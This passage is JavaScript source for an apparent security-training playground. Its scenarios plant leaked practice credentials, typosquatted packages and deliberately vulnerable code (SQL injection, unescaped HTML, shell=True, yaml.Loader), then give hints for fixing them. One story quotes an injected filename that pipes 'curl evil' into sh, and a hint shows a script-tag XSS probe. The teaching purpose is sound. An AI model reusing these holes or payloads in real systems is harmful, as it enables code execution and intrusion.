// Playground scenarios: each starts from the clean practice repository and
// breaks one thing the way it breaks at work. checks are the live status;
// a scenario is solved when every check passes. Practice data only: every
// key, token and advisory ID here is invented.
"use strict";

(function (root) {
  const S = root.DSSim;
  const R = root.DSRules;
  const D = root.DSRepo;
  const { pipeline } = root.DSShell;
  const { DAY, NOW, IMAGE_REPO, CI_IDENTITY } = S;

  const AWS_KEY = "AKIAPRACTICE7QK4WZ2N";
  const AWS_SECRET = "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";
  const INCIDENT_KEY = "AKIAPRACTICE3MNB5VXR";
  const BACKDOOR_KEY = "AKIAPRACTICE5BKDR7ZS";
  const CI_KEY = "AKIAPRACTICE6CIQZ7KT";
  const GH_PAT = "ghp_PRACTICEnotARealToken000000000000000";
  const DB_PW = "PRACTICE-db-Hq7mV2xLp9";

  // Checks most scenarios share.
  const PASSES = ["The pipeline passes on the latest commit", (s) => s.passing()];
  const INTACT = ["No scanner skipped, silenced or loosened", (s) => s.intact()];
  const head = (s, p) => s.head().tree[p] || "";
  const lockPin = (s, n) => (S.parseReqs(head(s, "requirements.txt")).pins[n] || {}).version;
  const atLeast = (v, min) => !!v && S.cmpVer(v, min) >= 0;
  const tfIds = (s) => s.tfFindings(s.head().tree).map((f) => f.id);
  const deployed = (s) => s.registry[s.cluster.image];
  // The image the pipeline built from the latest commit, if staging runs it.
  const release = (s) => (s.cluster.image === `${IMAGE_REPO}:${s.headSha().slice(0, 7)}` ? deployed(s) : null);
  const finalFrom = (text) => { const f = R.parseDockerfile(text).filter((x) => x.instr === "FROM"); return f.length ? R.parseFrom(f[f.length - 1].args) : {}; };
  // Change a dependency the way a developer does: edit requirements.in and recompile.
  function relock(s, inText, keep) {
    const input = S.parseReqs(inText);
    const res = S.resolve(input, keep || {}, null);
    return { "requirements.in": inText, "requirements.txt": S.lockText(res, "pip-compile requirements.in", false, input) };
  }
  const pins = (obj) => Object.fromEntries(Object.entries(obj).map(([k, v]) => [k, { version: v }]));

  const SCENARIOS = [
    // --- Secrets ---
    {
      id: "aws-key", group: "Secrets", level: "02", title: "AWS key committed",
      story: "gitleaks failed on main: an AWS access key is in app/storage.py, committed three days ago and pushed. The repository is visible to the whole company and two contractors.",
      goal: "Make the key useless, take it out of every commit on GitHub, and get the pipeline green.",
      setup(s) {
        s.addKey("fernleaf-uploader", AWS_KEY, AWS_SECRET, { lastUsed: NOW - 3600000 });
        s.commit("Upload invoices to S3", { "app/storage.py": s.edit("app/storage.py", 's3 = boto3.client("s3")', `s3 = boto3.client(\n    "s3",\n    aws_access_key_id="${AWS_KEY}",\n    aws_secret_access_key="${AWS_SECRET}",\n)`) }, { daysAgo: 3, push: true });
      },
      checks: [
        ["The leaked key is deactivated or deleted", (s) => !s.keyActive(AWS_KEY)],
        ["app/storage.py uses the Pod's IAM role, not a key", (s) => !!s.files["app/storage.py"] && !/AKIA|aws_secret/.test(s.files["app/storage.py"])],
        ["The key is gone from every commit on GitHub", (s) => s.pushed() && !s.remoteHas(/AKIAPRACTICE7QK4WZ2N|0nlyF0rTr4ining/)],
        PASSES, INTACT
      ],
      hints: [
        "Read the finding first: gitleaks git -v. Which key, which commit, and who could have cloned it since?",
        "Rotate first, purge second. aws iam create-access-key --user-name fernleaf-uploader if something still needs a key, then aws iam update-access-key --user-name fernleaf-uploader --access-key-id AKIAPRACTICE7QK4WZ2N --status Inactive. Put app/storage.py back to boto3.client(\"s3\") and commit.",
        "Now rewrite history: write both values into replace.txt (echo 'AKIAPRACTICE7QK4WZ2N==>REMOVED' > replace.txt, echo 'PRACTICE/aws/0nlyF0rTr4iningNotReal+K3y0==>REMOVED' >> replace.txt), git filter-repo --replace-text replace.txt --force, git remote add origin git@github.com:fernleaf/api.git, git push --force origin main, then pipeline."
      ],
      lesson: "A pushed secret is compromised the moment it lands: rotate it first, because rewriting history does not reach clones, forks or caches. Then purge it so scanners and new clones stay clean.",
      tries: ["gitleaks git -v", "aws iam list-access-keys --user-name fernleaf-uploader"]
    },
    {
      id: "dotenv", group: "Secrets", level: "02", title: ".env committed",
      story: "A developer committed .env with the production database password two days ago. Somebody had removed .env from .gitignore to share a setting.",
      goal: "Stop tracking .env, rotate the password, and purge the file from GitHub history.",
      setup(s) {
        s.commit("Share local settings", { ".gitignore": s.edit(".gitignore", ".env\n", ""), ".env": `DB_HOST=localhost\nDB_PASSWORD=${DB_PW}\nSESSION_SECRET=PRACTICE-session-9f8e7d6cQ2\n` }, { daysAgo: 2, push: true });
      },
      checks: [
        [".env is untracked and .gitignore lists it", (s) => !s.tracked(".env") && S.ignored(s.gitignore(), ".env")],
        ["The database password was rotated", (s) => s.rotated("prod/orders/db")],
        [".env is gone from every commit on GitHub", (s) => s.pushed() && !s.remoteHasPath(".env")],
        PASSES, INTACT
      ],
      hints: [
        "git log --stat shows the commit that added .env. gitleaks git -v shows what is in it.",
        "Rotate: aws secretsmanager rotate-secret --secret-id prod/orders/db (the app reads it through External Secrets). Then git rm --cached .env, add .env to .gitignore (echo .env >> .gitignore), commit.",
        "Purge: git filter-repo --path .env --invert-paths --force, git remote add origin git@github.com:fernleaf/api.git, git push --force origin main, pipeline."
      ],
      lesson: ".gitignore only stops untracked files; a tracked file stays tracked until git rm --cached. Deleting it in a new commit leaves every old commit holding the password, so rotate and rewrite.",
      tries: ["git status", "git log --stat -n 2"]
    },
    {
      id: "push-protection", group: "Secrets", level: "02", title: "Push blocked by push protection",
      story: "Your git push was rejected with GH013: Repository rule violations. Your last commit adds scripts/release.sh, which sets GH_TOKEN to a personal access token. Nothing has reached GitHub yet.",
      goal: "Get your commit pushed without the token in any commit.",
      setup(s) {
        s.commit("Add a release script", { "scripts/release.sh": `#!/usr/bin/env bash\nset -euo pipefail\n# Publishes release notes for the tag given as $1.\nGH_TOKEN="${GH_PAT}"\nexport GH_TOKEN\ngh release create "$1" --notes-file CHANGELOG.md\n` }, { daysAgo: 0 });
      },
      checks: [
        ["Your commits are on GitHub", (s) => s.pushed()],
        ["No commit contains the token", (s) => !s.localHas(/ghp_PRACTICE/)],
        ["release.sh takes GH_TOKEN from the environment", (s) => !!s.files["scripts/release.sh"] && /GH_TOKEN/.test(s.files["scripts/release.sh"]) && !/ghp_/.test(s.files["scripts/release.sh"])],
        PASSES, INTACT
      ],
      hints: [
        "git push shows which commit and line GitHub blocked. Push protection scans every commit you push, not just the last one.",
        "The token is only in your last, unpushed commit. Edit scripts/release.sh: replace the GH_TOKEN= line with : \"${GH_TOKEN:?set GH_TOKEN}\" (sed -i 's/^GH_TOKEN=.*/: \"${GH_TOKEN:?set GH_TOKEN}\"/' scripts/release.sh).",
        "Then rewrite that commit, not a new one on top: git commit -a --amend -m \"Add a release script\", git push, pipeline. A token that never left your laptop does not need rotating; one that reached GitHub does."
      ],
      lesson: "A fix in a new commit still pushes the old commit with the secret. Amend (or reset --soft) the commit that added it. Allowing the secret through the bypass link is never the fix.",
      tries: ["git push", "git log --oneline -n 3"]
    },
    {
      id: "docker-layer", group: "Secrets", level: "06", title: "Secret in a Docker layer",
      story: "The image scan fails: trivy found the package index token in /etc/pip.conf inside the image. CI writes pip.conf, the Dockerfile copies it in and deletes it after pip install. Last week someone also pushed an image built this way by hand: ghcr.io/fernleaf/api:hotfix-1.",
      goal: "Build without the token in any layer, and make the leaked token useless.",
      setup(s) {
        const df = D.FILES.Dockerfile.replace(/# syntax[\s\S]*?CMD/, `# syntax=docker/dockerfile:1
FROM python:3.12-slim
WORKDIR /srv
COPY requirements.txt .
COPY pip.conf /etc/pip.conf
RUN pip install --no-cache-dir -r requirements.txt && rm /etc/pip.conf
COPY app/ /srv/app/
USER 10001
EXPOSE 8080
CMD`);
        const ci = s.edit(".github/workflows/ci.yml", 'run: docker build --secret id=pip_token,env=PIP_TOKEN -t "$IMAGE" .', `run: |
          printf '[global]\\nindex-url = https://ci:%s@pypi.fernleaf.internal/simple\\n' "$PIP_TOKEN" > pip.conf
          docker build -t "$IMAGE" .`);
        s.commit("Simplify the Docker build", { Dockerfile: df, ".github/workflows/ci.yml": ci }, { daysAgo: 4, push: true });
        const leaked = s.build({ ...s.head().tree, "pip.conf": `[global]\nindex-url = https://ci:${s.gh.secrets.PIP_TOKEN}@pypi.fernleaf.internal/simple\n` }, `${IMAGE_REPO}:hotfix-1`, {}).image;
        s.registry[`${IMAGE_REPO}:hotfix-1`] = { image: leaked, digest: leaked.digest, sigs: [], atts: [] };
        pipeline(s);
      },
      checks: [
        ["The Dockerfile never copies pip.conf; the token is mounted as a build secret", (s) => !/pip\.conf/.test(head(s, "Dockerfile")) && /--mount=type=secret/.test(head(s, "Dockerfile")) && !/pip\.conf/.test(head(s, ".github/workflows/ci.yml"))],
        ["The token was rotated and CI has the new one", (s) => s.rotated("ci/pip-token") && s.ghSecretCurrent()],
        PASSES, INTACT
      ],
      hints: [
        "trivy image ghcr.io/fernleaf/api:hotfix-1 shows the file and the layer that added it. docker history shows the rm came later.",
        "Each Dockerfile line is a layer; rm only hides the file in the next one. Use RUN --mount=type=secret,id=pip_token for the pip install line, as the original Dockerfile did (git show HEAD~1:Dockerfile), and in ci.yml: docker build --secret id=pip_token,env=PIP_TOKEN -t \"$IMAGE\" .",
        "The hand-pushed image still holds the old token: aws secretsmanager rotate-secret --secret-id ci/pip-token, then gh secret set PIP_TOKEN --body \"$(aws secretsmanager get-secret-value --secret-id ci/pip-token --query SecretString --output text)\". Commit and run the pipeline."
      ],
      lesson: "Image layers are additive: anything COPYed stays in that layer for anyone who can pull the image. BuildKit secret mounts give a step the credential without writing it to a layer.",
      tries: ["trivy image ghcr.io/fernleaf/api:hotfix-1", "docker history ghcr.io/fernleaf/api:hotfix-1"]
    },
    {
      id: "build-args", group: "Secrets", level: "06", title: "Secret passed as a build argument",
      story: "A contractor with pull access mentioned they could see our package index token in docker history. The Dockerfile was flattened to one stage and CI passes the token with --build-arg.",
      goal: "Build without the token in the image history, and rotate it.",
      setup(s) {
        const df = `# syntax=docker/dockerfile:1
FROM python:3.12-slim
ARG PIP_TOKEN
WORKDIR /srv
COPY requirements.txt .
RUN PIP_INDEX_URL="https://ci:\${PIP_TOKEN}@pypi.fernleaf.internal/simple" pip install --no-cache-dir -r requirements.txt
COPY app/ /srv/app/
USER 10001
EXPOSE 8080
CMD ["gunicorn", "--bind", "0.0.0.0:8080", "app.main:app"]
`;
        const ci = s.edit(".github/workflows/ci.yml", 'run: docker build --secret id=pip_token,env=PIP_TOKEN -t "$IMAGE" .', 'run: docker build --build-arg PIP_TOKEN=${{ secrets.PIP_TOKEN }} -t "$IMAGE" .');
        s.commit("One-stage Dockerfile", { Dockerfile: df, ".github/workflows/ci.yml": ci }, { daysAgo: 5, push: true });
        pipeline(s);
      },
      checks: [
        ["No ARG or ENV carries a secret", (s) => !R.checkDockerfile(head(s, "Dockerfile")).some((f) => f.id === "secret-in-build-arg")],
        ["CI passes the token as a BuildKit secret", (s) => /--secret id=pip_token/.test(head(s, ".github/workflows/ci.yml")) && !/--build-arg\s+\S*TOKEN/.test(head(s, ".github/workflows/ci.yml"))],
        ["The token was rotated and CI has the new one", (s) => s.rotated("ci/pip-token") && s.ghSecretCurrent()],
        PASSES, INTACT
      ],
      hints: [
        "docker history --no-trunc on the running image (kubectl describe pod api -n shop shows which) prints the RUN line with |1 PIP_TOKEN=...",
        "Build arguments are recorded in the history of every RUN that uses them. Bring back the secret mount: git show HEAD~1:Dockerfile, and in ci.yml use env PIP_TOKEN with docker build --secret id=pip_token,env=PIP_TOKEN.",
        "Rotate what was exposed: aws secretsmanager rotate-secret --secret-id ci/pip-token and gh secret set PIP_TOKEN --body \"$(aws secretsmanager get-secret-value --secret-id ci/pip-token --query SecretString --output text)\". Commit, pipeline."
      ],
      lesson: "ARG and ENV values are saved in the image config and history. Secrets belong in RUN --mount=type=secret, which exists only for that step.",
      tries: ["docker history ghcr.io/fernleaf/api:1.0.0", "cat Dockerfile"]
    },

    // --- Dependencies ---
    {
      id: "vuln-dep", group: "Dependencies", level: "04", title: "Vulnerable dependency with a fix",
      story: "osv-scanner blocks the release: imgresize 2.1.0 has a critical path traversal (PRACTICE-2026-0001). Somebody pinned the old version for a thumbnail bug last month.",
      goal: "Move to a fixed version and get the pipeline green.",
      setup(s) {
        s.commit("Pin imgresize for the thumbnail bug", relock(s, s.edit("requirements.in", "imgresize\n", "imgresize==2.1.0\n")), { daysAgo: 1, push: true });
      },
      checks: [["imgresize is at 2.1.4 or later", (s) => atLeast(lockPin(s, "imgresize"), "2.1.4")], PASSES, INTACT],
      hints: [
        "osv-scanner scan source -r . names the package, the version and the first fixed version.",
        "requirements.in is what you ask for; requirements.txt is what pip-compile resolved. The pin is in requirements.in.",
        "sed -i 's/imgresize==2.1.0/imgresize>=2.1.4/' requirements.in, pip-compile --upgrade-package imgresize requirements.in, git commit -am \"Upgrade imgresize\", pipeline."
      ],
      lesson: "When a fix exists, upgrading is the answer; an ignore entry for a fixable vulnerability is just hiding it. Change the source of the pin, then regenerate the lock.",
      tries: ["osv-scanner scan source -r .", "pip index versions imgresize"]
    },
    {
      id: "transitive", group: "Dependencies", level: "04", title: "Transitive vulnerability",
      story: "osv-scanner flags xmlsafe 0.9.2 (PRACTICE-2026-0007, XXE). Nobody installed xmlsafe; it came with reportgen.",
      goal: "Get a fixed xmlsafe into the lock file.",
      setup(s) {
        s.commit("Lock dependencies", relock(s, D.FILES["requirements.in"], pins({ reportgen: "1.8.0", xmlsafe: "0.9.2" })), { daysAgo: 12, push: true });
      },
      checks: [["xmlsafe is at 0.9.5 or later", (s) => atLeast(lockPin(s, "xmlsafe"), "0.9.5")], PASSES, INTACT],
      hints: [
        "grep -n -A2 xmlsafe requirements.txt shows # via reportgen: it is a transitive dependency.",
        "pip-compile --upgrade-package xmlsafe changes nothing: reportgen 1.8.0 requires xmlsafe<0.9.3. Check pip index versions reportgen.",
        "Upgrade the parent: pip-compile --upgrade-package reportgen requirements.in. Commit, pipeline."
      ],
      lesson: "Most vulnerable packages are transitive. Find who pulls them in; upgrading the parent is cleaner than forcing a version the parent says it cannot use.",
      tries: ["osv-scanner scan source -r .", "grep -n -A2 xmlsafe requirements.txt"]
    },
    {
      id: "no-fix", group: "Dependencies", level: "11", title: "No fix available: accept the risk",
      story: "Invoices need pdfstamp, and pdfstamp 4.2.0 has a HIGH denial of service (PRACTICE-2026-0012) with no fixed version. There is no other library. We only feed it PDFs we generate ourselves; uploads never reach it.",
      goal: "Ship with a reviewed, expiring exception instead of a silenced scanner.",
      setup(s) {
        s.commit("Generate invoice PDFs", relock(s, D.FILES["requirements.in"] + "pdfstamp\n"), { daysAgo: 1, push: true });
      },
      checks: [
        ["osv-scanner.toml has an exception for PRACTICE-2026-0012 with a reason and an ignoreUntil within 90 days", (s) => { const v = s.depFindings(s.head().tree).vulns.find((x) => x.id === "PRACTICE-2026-0012"); return !!v && s.exceptionOk(v.ignored, v, s.head().tree); }],
        ["pdfstamp is still installed: invoices need it", (s) => !!lockPin(s, "pdfstamp")],
        PASSES, INTACT
      ],
      hints: [
        "osv-scanner shows FIXED VERSION --. Upgrading is impossible; ignore-unfixed for the whole scan would hide every future one too.",
        "osv-scanner reads osv-scanner.toml: an [[IgnoredVulns]] entry with id, ignoreUntil and reason. security/policy.yaml allows 90 days at most.",
        "Use the editor (edit osv-scanner.toml) or echo lines into it: [[IgnoredVulns]] / id = \"PRACTICE-2026-0012\" / ignoreUntil = 2027-01-15T00:00:00Z / reason = \"No fix. Only our own generated PDFs reach pdfstamp. Review in SEC-2231.\" Commit, pipeline."
      ],
      lesson: "Risk acceptance is a decision with an owner, a reason and an end date, scoped to one advisory. When it expires the gate fails again and somebody looks.",
      tries: ["osv-scanner scan source -r .", "pip index versions pdfstamp"]
    },
    {
      id: "typosquat", group: "Dependencies", level: "05", title: "Typosquatted package",
      story: "osv-scanner flags reqeusts as malicious (PRACTICE-2026-0031). A developer added it yesterday for a webhook; it ran in CI, where the job had the package index token in its environment.",
      goal: "Remove the typosquat, use the real package, and rotate what it could read.",
      setup(s) {
        s.commit("Send order webhooks", relock(s, D.FILES["requirements.in"] + "reqeusts\n"), { daysAgo: 1, push: true });
      },
      checks: [
        ["reqeusts is gone and requests is used", (s) => !lockPin(s, "reqeusts") && !!lockPin(s, "requests")],
        ["The index token was rotated and CI has the new one", (s) => s.rotated("ci/pip-token") && s.ghSecretCurrent()],
        PASSES, INTACT
      ],
      hints: [
        "osv-scanner scan source -r . names the package. Compare the spelling with the library you meant.",
        "sed -i 's/^reqeusts$/requests/' requirements.in, then pip-compile requirements.in.",
        "Its install script ran in CI: aws secretsmanager rotate-secret --secret-id ci/pip-token, gh secret set PIP_TOKEN --body \"$(aws secretsmanager get-secret-value --secret-id ci/pip-token --query SecretString --output text)\". Commit, pipeline."
      ],
      lesson: "Malicious packages run code at install time, so removing them is half the job: rotate every secret the installing job could see.",
      tries: ["osv-scanner scan source -r .", "cat requirements.in"]
    },
    {
      id: "dep-confusion", group: "Dependencies", level: "05", title: "Dependency confusion",
      story: "The build logs show fernleaf-billing 99.0.0 downloaded from pypi.org. Our own fernleaf-billing is 1.4.2 on the internal index. Someone added --extra-index-url https://pypi.org/simple to get a package faster.",
      goal: "Install internal packages only from the internal index, and rotate what the fake package could read.",
      setup(s) {
        s.commit("Add PyPI as an extra index", relock(s, s.edit("requirements.in", "--index-url https://pypi.fernleaf.internal/simple\n", "--index-url https://pypi.fernleaf.internal/simple\n--extra-index-url https://pypi.org/simple\n")), { daysAgo: 2, push: true });
      },
      checks: [
        ["requirements.in uses a single index", (s) => S.parseReqs(head(s, "requirements.in")).extra.length === 0],
        ["fernleaf-billing resolves to the internal 1.4.2", (s) => lockPin(s, "fernleaf-billing") === "1.4.2"],
        ["The index token was rotated and CI has the new one", (s) => s.rotated("ci/pip-token") && s.ghSecretCurrent()],
        PASSES, INTACT
      ],
      hints: [
        "pip install -r requirements.txt shows where each package came from. Who publishes fernleaf-billing 99.0.0?",
        "With --extra-index-url pip treats both indexes as equal and takes the highest version. Pinning 1.4.2 is not enough: the attacker can publish 1.4.2 too. Delete the --extra-index-url line; the internal index already mirrors PyPI.",
        "sed -i '/extra-index-url/d' requirements.in, pip-compile requirements.in, rotate ci/pip-token and update the PIP_TOKEN secret (see the typosquat scenario), commit, pipeline."
      ],
      lesson: "Dependency confusion abuses resolvers that merge indexes. Use one index that serves internal names only from inside, scope private names, and pin with hashes.",
      tries: ["pip install -r requirements.txt", "osv-scanner scan source -r ."]
    },
    {
      id: "license", group: "Dependencies", level: "04", title: "Licence violation",
      story: "The licence check blocks the release: chartforge is AGPL-3.0-only, which our legal policy forbids for a hosted, closed-source service. It replaced plotkit last week for nicer charts.",
      goal: "Ship without a forbidden licence.",
      setup(s) {
        s.commit("Switch charts to chartforge", relock(s, s.edit("requirements.in", "plotkit<2\n", "chartforge\n")), { daysAgo: 6, push: true });
      },
      checks: [["No package with a forbidden licence", (s) => !s.licenseFindings(s.head().tree).length], PASSES, INTACT],
      hints: [
        "trivy fs --scanners license . lists each package's licence and which are forbidden.",
        "Changing security/policy.yaml to allow AGPL is a legal decision, not yours to make in a pull request. Go back to the MIT-licensed plotkit.",
        "sed -i 's/^chartforge$/plotkit<2/' requirements.in, pip-compile requirements.in, commit, pipeline."
      ],
      lesson: "Licence compliance is part of the supply chain: the SBOM lists every licence, and the gate enforces the list legal agreed.",
      tries: ["trivy fs --scanners license .", "cat security/policy.yaml"]
    },
    {
      id: "unpinned-deps", group: "Dependencies", level: "04", title: "Unpinned dependencies",
      story: "Two builds of the same commit produced different SBOMs. requirements.txt was replaced by a hand-written list of ranges like flask>=3.0, so every build resolves again.",
      goal: "Make every build install exactly the same, verified packages.",
      setup(s) {
        s.commit("Simplify requirements", { "requirements.txt": "--index-url https://pypi.fernleaf.internal/simple\nflask>=3.0\npsycopg>=3.2\ngunicorn\nboto3\npyyaml\nimgresize>=2.1.4\nreportgen>=1.9\nplotkit\nquickcache\nfernleaf-billing\n" }, { daysAgo: 3, push: true });
      },
      checks: [
        ["requirements.txt pins every package", (s) => !S.parseReqs(head(s, "requirements.txt")).unpinned.length && Object.keys(S.parseReqs(head(s, "requirements.txt")).pins).length > 10],
        ["…with hashes, so a changed file cannot be installed", (s) => S.parseReqs(head(s, "requirements.txt")).hashes],
        PASSES, INTACT
      ],
      hints: [
        "osv-scanner warns that most requirements are not pinned: it cannot tell which versions you run.",
        "requirements.in holds the ranges; requirements.txt should be generated from it.",
        "pip-compile --generate-hashes requirements.in, commit, pipeline."
      ],
      lesson: "A lock file makes builds reproducible and scannable; hashes make them tamper-evident (pip refuses a file whose hash changed).",
      tries: ["osv-scanner scan source -r .", "cat requirements.txt"]
    },

    // --- Code ---
    {
      id: "sqli", group: "Code", level: "03", title: "SQL injection flagged by SAST",
      story: "semgrep blocks a pull request that made search faster: it builds the SQL with an f-string.",
      goal: "Make search safe and get the pipeline green.",
      setup(s) {
        s.commit("Faster search", { "app/main.py": s.edit("app/main.py", `rows = db.query("SELECT id, title FROM books WHERE title ILIKE %s", (f"%{q}%",))`, `rows = db.query(f"SELECT id, title FROM books WHERE title ILIKE '%{q}%'")`) }, { daysAgo: 0, push: true });
      },
      checks: [["search() passes q as a query parameter", (s) => !s.sast(s.head().tree).some((f) => f.rule === S.SAST.sqlFormat && f.file === "app/main.py") && /ILIKE %s", \(/.test(head(s, "app/main.py"))], PASSES, INTACT],
      hints: [
        "semgrep scan --config p/python app/ shows the line.",
        "Escaping quotes yourself (q.replace(\"'\", \"''\")) still builds SQL from input. The driver should send the value separately.",
        "Edit app/main.py: rows = db.query(\"SELECT id, title FROM books WHERE title ILIKE %s\", (f\"%{q}%\",)). Commit, pipeline."
      ],
      lesson: "Parameterised queries keep data out of the SQL text, which is the only reliable fix for injection (OWASP Top 10:2025 A05 Injection).",
      tries: ["semgrep scan --config p/python app/", "grep -n query app/main.py"]
    },
    {
      id: "xss", group: "Code", level: "03", title: "Reflected XSS",
      story: "semgrep flags search(): it returns the search term inside HTML without escaping it. Someone removed escape() because titles showed &amp;.",
      goal: "Escape user input in the page and pass SAST and DAST.",
      setup(s) {
        s.commit("Show titles as written", { "app/main.py": s.edit("app/main.py", `return f"<h1>Results for {escape(q)}</h1>" + "".join(f"<p>{escape(r[1])}</p>" for r in rows)`, `return f"<h1>Results for {q}</h1>" + "".join(f"<p>{r[1]}</p>" for r in rows)`) }, { daysAgo: 1, push: true });
      },
      checks: [["Every value in the returned HTML is escaped", (s) => !s.sast(s.head().tree).some((f) => f.rule === S.SAST.xss)], PASSES, INTACT],
      hints: [
        "curl 'https://staging.fernleaf.example/search?q=<script>alert(1)</script>' after a deploy shows the script coming back as code. semgrep shows the line.",
        "Filtering out <script> misses <img onerror=...> and many more. Escape on output.",
        "Edit app/main.py so both values go through escape(): {escape(q)} and {escape(r[1])}. Commit, pipeline."
      ],
      lesson: "Encode output for the context it lands in; templates do it by default. Blocklists of tags always miss a variant.",
      tries: ["semgrep scan --config p/python app/", "grep -n return app/main.py"]
    },
    {
      id: "hardcoded", group: "Code", level: "02", title: "Hard-coded password caught before commit",
      story: "To test against the real database you put its password into app/db.py, and added a ping() helper. git commit fails: the pre-commit hook runs gitleaks.",
      goal: "Commit your change without the password ever entering history.",
      setup(s) {
        s.hooks.preCommit = true;
        const db = s.edit("app/db.py", 'password=os.environ["DB_PASSWORD"],', `password="${DB_PW}",`) + "\n\ndef ping():\n    return query(\"SELECT 1\")\n";
        s.files["app/db.py"] = db;
        s.index["app/db.py"] = db;
      },
      checks: [
        ["ping() is committed", (s) => /def ping/.test(head(s, "app/db.py"))],
        ["db.py reads the password from the environment", (s) => /os\.environ\["DB_PASSWORD"\]/.test(head(s, "app/db.py"))],
        ["No commit contains the password, or it was rotated", (s) => !s.localHas(/PRACTICE-db-Hq7mV2xLp9/) || s.rotated("prod/orders/db")],
        PASSES, INTACT
      ],
      hints: [
        "git commit -m \"Add ping\" shows the hook's gitleaks finding.",
        "git commit --no-verify skips the hook and puts the password into history: then it must be rotated and purged. Fix the code instead.",
        "sed -i 's/password=\"PRACTICE-db-Hq7mV2xLp9\",/password=os.environ[\"DB_PASSWORD\"],/' app/db.py, git commit -am \"Add ping\", pipeline. Set DB_PASSWORD in your shell for local testing."
      ],
      lesson: "Catching a secret before commit is the cheapest place to catch it: nothing to rotate, nothing to purge. That is shift-left in one step.",
      tries: ["git status", "git diff --staged"]
    },
    {
      id: "yaml-load", group: "Code", level: "03", title: "Unsafe deserialisation",
      story: "semgrep blocks a change to catalogue imports: yaml.load with yaml.Loader, which can build arbitrary Python objects from the request body.",
      goal: "Parse the upload safely.",
      setup(s) {
        s.commit("Support YAML tags in imports", { "app/main.py": s.edit("app/main.py", "catalogue = yaml.safe_load(request.data)", "catalogue = yaml.load(request.data, Loader=yaml.Loader)") }, { daysAgo: 0, push: true });
      },
      checks: [["Imports use yaml.safe_load", (s) => /yaml\.safe_load\(request\.data\)/.test(head(s, "app/main.py")) && !s.sast(s.head().tree).some((f) => f.rule === S.SAST.yaml)], PASSES, INTACT],
      hints: [
        "semgrep scan --config p/python app/ explains why yaml.Loader is dangerous.",
        "Untrusted input must never choose which objects get built. Catalogue data is plain lists and dicts.",
        "sed -i 's/yaml.load(request.data, Loader=yaml.Loader)/yaml.safe_load(request.data)/' app/main.py, commit, pipeline."
      ],
      lesson: "Deserialisers that construct objects (yaml.Loader, pickle) turn input into code execution. Use the safe loader (OWASP Top 10:2025 A08 Software or Data Integrity Failures).",
      tries: ["semgrep scan --config p/python app/", "grep -n yaml app/main.py"]
    },
    {
      id: "cmd-injection", group: "Code", level: "03", title: "Command injection",
      story: "Cover uploads now keep the original filename and resize it with shell=True. semgrep blocks it. A filename like x.png;curl evil|sh would run.",
      goal: "Run the resize without a shell.",
      setup(s) {
        s.commit("Keep upload names", {
          "app/main.py": s.edit("app/main.py", 'subprocess.run(["convert", path, "-resize", "400x600", path], check=True)', 'subprocess.run(f"convert {path} -resize 400x600 {path}", shell=True, check=True)'),
          "app/storage.py": s.edit("app/storage.py", 'path = f"/tmp/cover-{book_id}.png"', 'path = f"/tmp/{file.filename}"')
        }, { daysAgo: 0, push: true });
      },
      checks: [["No shell=True; arguments are passed as a list", (s) => !s.sast(s.head().tree).some((f) => f.rule === S.SAST.shell) && /subprocess\.run\(\[/.test(head(s, "app/main.py"))], PASSES, INTACT],
      hints: [
        "semgrep shows the line and why shell=True is dangerous.",
        "shlex.quote with shell=True still runs a shell, and semgrep still flags it. A list of arguments never goes through one.",
        "Edit app/main.py: subprocess.run([\"convert\", path, \"-resize\", \"400x600\", path], check=True). Commit, pipeline. Better still, do not trust upload names: go back to cover-{book_id}.png in storage.py."
      ],
      lesson: "Pass argument lists to subprocess and never build shell strings from input.",
      tries: ["semgrep scan --config p/python app/", "grep -n subprocess app/main.py"]
    },
    {
      id: "false-positive", group: "Code", level: "11", title: "False positive, suppressed responsibly",
      story: "semgrep flags reports.build(): an f-string puts a table name into SQL. Table names cannot be query parameters, and the name only ever comes from the fixed TABLES allowlist. Security agreed it is a false positive (SEC-418).",
      goal: "Unblock the release without hiding anything else.",
      setup(s) {
        s.commit("Stock reports", { "app/reports.py": `from reportgen import Report

from . import db

# Reports can only read these tables; anything else raises KeyError.
TABLES = {"sales": "sales_daily", "stock": "stock_levels"}


def build(kind):
    table = TABLES[kind]
    rows = db.query(f"SELECT * FROM {table} ORDER BY day DESC LIMIT 90")
    return Report(rows).to_pdf()
` }, { daysAgo: 0, push: true });
      },
      checks: [
        ["The finding is fixed, or suppressed with its rule ID and a written reason", (s) => !s.sast(s.head().tree).some((f) => f.file === "app/reports.py" && !f.suppressed)],
        ["TABLES still decides which tables can be read", (s) => /TABLES\[kind\]/.test(head(s, "app/reports.py"))],
        PASSES, INTACT
      ],
      hints: [
        "semgrep shows the rule ID: python.lang.security.audit.formatted-sql-query.formatted-sql-query.",
        "A bare # nosemgrep hides every rule on the line, and excluding the rule in ci.yml hides it everywhere. Suppress one rule, on one line, with a reason a reviewer can check.",
        "Edit app/reports.py: above the query add # Table name comes from the fixed TABLES allowlist; identifiers cannot be parameters (SEC-418). and end the query line with # nosemgrep: python.lang.security.audit.formatted-sql-query.formatted-sql-query. Or use psycopg.sql.Identifier. Commit, pipeline."
      ],
      lesson: "Suppressions are code: narrow (one rule, one line), explained, and reviewed. That keeps the scanner trusted for the next real finding.",
      tries: ["semgrep scan --config p/python app/", "cat app/reports.py"]
    },
    {
      id: "silent-gate", group: "CI/CD and supply chain", level: "09", title: "The scanner that could not fail",
      story: "A penetration test found SQL injection in search, yet the pipeline has been green for weeks. Three weeks ago someone added continue-on-error: true to the semgrep step during an outage and never removed it.",
      goal: "Make SAST able to fail again, and fix what it was hiding.",
      setup(s) {
        s.commit("Faster search", { "app/main.py": s.edit("app/main.py", `rows = db.query("SELECT id, title FROM books WHERE title ILIKE %s", (f"%{q}%",))`, `rows = db.query(f"SELECT id, title FROM books WHERE title ILIKE '%{q}%'")`) }, { daysAgo: 20 });
        s.commit("Unblock deploys during the semgrep outage", { ".github/workflows/ci.yml": s.edit(".github/workflows/ci.yml", "      - name: SAST (semgrep)\n", "      - name: SAST (semgrep)\n        continue-on-error: true\n") }, { daysAgo: 21, push: true });
      },
      checks: [
        ["The semgrep step can fail the build", (s) => !s.workflows(s.head().tree).some((f) => f.id === "scanner-cannot-fail")],
        ["search() uses a query parameter", (s) => !s.sast(s.head().tree).some((f) => f.rule === S.SAST.sqlFormat)],
        PASSES, INTACT
      ],
      hints: [
        "pipeline: the SAST line says passed, with findings ignored. Look at the step in .github/workflows/ci.yml.",
        "Remove continue-on-error: true from the semgrep step (sed -i '/continue-on-error: true/d' .github/workflows/ci.yml). Now it fails, as it should.",
